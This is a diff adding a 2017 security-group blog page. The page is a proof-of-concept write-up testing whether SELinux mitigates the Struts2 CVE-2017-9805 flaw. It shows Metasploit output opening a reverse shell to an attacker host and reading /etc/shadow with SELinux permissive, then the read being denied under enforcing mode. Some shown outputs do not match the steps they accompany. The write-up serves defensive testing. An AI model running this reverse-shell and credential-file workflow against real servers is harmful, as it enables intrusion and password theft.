@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html xmlns="//www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
+    <head>
+        
+        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+
+        <title>S2-052: CVE-2017-9805(Struts2) PoC with SELinux &middot; OSSセキュリティ技術の会（Secure OSS SIG)</title>
+        <link rel='stylesheet' href='//fonts.googleapis.com/css?family=Open+Sans:400,300,600' type='text/css'>
+        <link rel="stylesheet" href="https://jsoss-sig.github.io//libraries/normalize.3.0.1.css" />
+        <link rel="stylesheet" href="https://jsoss-sig.github.io//css/liquorice.css" />
+        <link rel="shortcut icon" href="https://jsoss-sig.github.io/favicon.ico" />
+        <link rel="apple-touch-icon-precomposed" href="https://jsoss-sig.github.io/apple-touch-icon-144-precomposed.png" sizes="144x144" />
+        <link rel="alternate" href="" type="application/rss+xml" title="OSSセキュリティ技術の会（Secure OSS SIG)" />
+    </head>
+    <body class="li-body">
+
+<header class="li-page-header">
+    <div class="container">
+        <div class="row">
+            <div class="sixteen columns">
+                <div class="li-brand li-left">
+                <a href="https://jsoss-sig.github.io/">OSSセキュリティ技術の会（Secure OSS SIG)</a></div>
+                <div class="li-menu li-right">
+                    <span class="li-menu-icon" onclick="javascript:toggle('menu');">&#9776;</span>
+                    <ul id="menu2" class="li-menu-items">
+                        
+                            <li><a href="https://jsoss-sig.github.io/about/about/"> 会について(About us) </a></li>
+                        
+                            <li><a href="https://jsoss-sig.github.io/post/"> Blog </a></li>
+                        
+                            <li><a href="https://jsoss-sig.github.io/event/"> イベント等(Events) </a></li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="row">
+            <div class="sixteen columns">
+                <ul id="menu" class="li-menu-items li-menu-mobile">
+                    
+                        <li><a href="https://jsoss-sig.github.io/about/about/"> 会について(About us) </a></li>
+                    
+                        <li><a href="https://jsoss-sig.github.io/post/"> Blog </a></li>
+                    
+                        <li><a href="https://jsoss-sig.github.io/event/"> イベント等(Events) </a></li>
+                    
+                </ul>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+
+
+    <div class="container">
+        <div class="row">
+            <div class="sixteen columns">
+                <article class="li-article">
+                    <header class="li-article-header">
+                        <h1 class="li-article-title">S2-052: CVE-2017-9805(Struts2) PoC with SELinux</h1>
+                        <span class="li-article-taxonomies">
+                            
+
+                            
+                        </span>
+                        
+                        <time class="li-article-date">Monday, September 11, 2017</time>
+                    </header>
+                    <section>
+                        
+
+<p>We did recently &ldquo;Important&rdquo; Struts2 vulnerability(CVE-2017-9805) PoC to check how SELinux can mitigate that vulnerability.</p>
+
+<p>(Written by Kazuki Omo:ka-omo@sios.com).</p>
+
+<h2 id="prepare-for-poc">Prepare for PoC</h2>
+
+<p>Here is a description how to reproduce it. <strong>I used CentOS7 image for the PoC.
+I used VMWare Guest(CPU: 1, Memory: 2GB) for the PoC.</strong>
+Also, I used selinux-policy-targeted-3.13.1-145.el7.noarch (See related post: <a href="http://www.secureoss.jp/post/omok-selinux-struts2-20170607/">http://www.secureoss.jp/post/omok-selinux-struts2-20170607/</a>).</p>
+
+<ol>
+<li><p>Install tomcat and related packages for working Struts2.</p></li>
+
+<li><p>Download and install vulnerable version of Struts2. I used struts-2.5.11. Copy struts2-showcase.war and struts2-rest-showcase.war under /var/lib/tomcat/webapps</p>
+
+<pre><code>root@centos7:~# ls /var/ls /var/lib/tomcat/webapps/*war
+/var/lib/tomcat/webapps/struts2-showcase.war
+/var/lib/tomcat/webapps/struts2-rest-showcase.war
+</code></pre></li>
+
+<li><p>Prepare Metasploit for the PoC. You can easy to use &ldquo;Kali Linux(<a href="https://www.kali.org/downloads/)&quot;">https://www.kali.org/downloads/)&quot;</a> for running Metasploit Framework. Run &ldquo;apt-get update ; apt-get upgrade&rdquo; for updating Kali Linux completely, then follow the procedure for running CVE-2017-9805 PoC (Set up Metasploit Module for Apache Struts2 Rest : <a href="http://hackersgrid.com/2017/09/metasploit-module-for-apache-struts-2-rest-cve-2017-9805.html">http://hackersgrid.com/2017/09/metasploit-module-for-apache-struts-2-rest-cve-2017-9805.html</a>).</p></li>
+
+<li><p>To avoid normal Unix permission check for the PoC, I changed /etc/shadow permission to 755.</p>
+
+<pre><code>root@centos7:~# ls -lZ /etc/shadow
+-rw-r--r--. root root system_u:object_r:shadow_t:s0        /etc/shadow
+</code></pre></li>
+</ol>
+
+<hr />
+
+<h2 id="poc-with-no-selinux-selinux-permissive">PoC with no SELinux(SELinux Permissive)</h2>
+
+<ol>
+<li><p>Confirm SELinux is Permissive mode;</p>
+
+<pre><code>root@centos7:~# getenforce
+Permissive
+</code></pre></li>
+
+<li><p>Run PoC from msfconsole(Metasploit). AA.AA.AA.AA is Kali Linux IP, and XX.XX.X.XX is Struts2 PoC server;</p>
+
+<pre><code> msf exploit(struts2_rest_xstream) &gt; exploit
+
+ [*] Started reverse TCP double handler on AA.AA.AA.AA:4444 
+ [*] Accepted the first client connection...
+ [*] Accepted the second client connection...
+ [*] Command: echo DxP98C50UAVxX6jn;
+ [*] Writing to socket A
+ [*] Writing to socket B
+ [*] Reading from sockets...
+ [*] Reading from socket B
+ [*] B: &quot;DxP98C50UAVxX6jn\r\n&quot;
+ [*] Matching...
+ [*] A is input...
+ [*] Command shell session 2 opened (AA.AA.AA.AA:4444 -&gt; XX.XX.XX.XX:43584) at 2017-09-11 15:49:01 +0900
+
+ id
+ uid=91(tomcat) gid=91(tomcat) groups=91(tomcat) context=system_u:system_r:tomcat_t:s0
+
+ root:XXXXXX.::0:99999:7:::
+ bin:*:17110:0:99999:7:::
+ daemon:*:17110:0:99999:7:::
+ --snip--
+ sshd:!!:17247::::::
+ jssosug:XXXXXXXXXXXX::0:99999:7:::
+
+ jsossug@vmhost:~$
+</code></pre></li>
+</ol>
+
+<hr />
+
+<h2 id="poc-with-selinux-enabled-selinux-enforcing">PoC with SELinux Enabled(SELinux Enforcing)</h2>
+
+<ol>
+<li><p>Reboot and set SELinux as Enforcing.</p>
+
+<pre><code>root@centos7:~# getenforce
+Permissive
+</code></pre></li>
+
+<li><p>Run PoC from msfconsole(Metasploit). AA.AA.AA.AA is Kali Linux IP, and XX.XX.X.XX is Struts2 PoC server;</p>
+
+<pre><code> msf exploit(struts2_rest_xstream) &gt; exploit
+
+ [*] Started reverse TCP double handler on AA.AA.AA.AA:4444 
+ [*] Accepted the first client connection...
+ [*] Accepted the second client connection...
+ [*] Command: echo DxP98C50UAVxX6jn;
+ [*] Writing to socket A
+ [*] Writing to socket B
+ [*] Reading from sockets...
+ [*] Reading from socket B
+ [*] B: &quot;DxP98C50UAVxX6jn\r\n&quot;
+ [*] Matching...
+ [*] A is input...
+ [*] Command shell session 2 opened (AA.AA.AA.AA:4444 -&gt; XX.XX.XX.XX:43584) at 2017-09-11 15:49:01 +0900
+
+ id 
+ uid=91(tomcat) gid=91(tomcat) groups=91(tomcat) context=system_u:system_r:tomcat_t:s0
+
+ cat /etc/shadow
+ cat: /etc/shadow: Permission denied
+</code></pre>
+
+<ol>
+<li><p>Check AVC log on Struts PC;</p>
+
+<p>type=AVC msg=audit(1505112552.257:431): avc:  denied  { read } for  pid=4684 comm=&ldquo;cat&rdquo; name=&ldquo;shadow&rdquo; dev=&ldquo;dm-1&rdquo; ino=34690693 scontext=system_u:system_r:tomcat_t:s0 tcontext=system_u:object_r:shadow_t:s0 tclass=file</p></li>
+</ol></li>
+</ol>
+
+<hr />
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>From this PoC we can say</p>
+
+<ol>
+<li>Latest SELinux can mitigate Struts2 vulnerability &ldquo;if Policy is updated&rdquo;.</li>
+</ol>
+
+                    </section>
+                </article>
+            </div>
+        </div>
+
+        <div class="row li-author">
+    <div class="sixteen columns">
+        Written by <strong>SOSS SIG</strong>
+    </div>
+</div>
+
+
+        <div class="row li-pagination">
+            <div class="eight columns">
+                <div class="li-pagination-previous">
+                    
+                        &nbsp;
+                    
+                </div>
+            </div>
+            <div class="eight columns">
+                <div class="li-pagination-next">
+                    
+                        Older article<br />
+                        <a href="https://jsoss-sig.github.io/post/omok-selinux-struts2-20170809/"> S2-048: CVE-2017-9791(Struts2) PoC with SELinux</a>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <script type="text/javascript">
+    <!--
+    function toggle(id) {
+        var e = document.getElementById(id);
+        e.style.display == 'block' ? e.style.display = 'none' : e.style.display = 'block';
+    }
+    
+    </script>
+    
+    </body>
+</html>
+
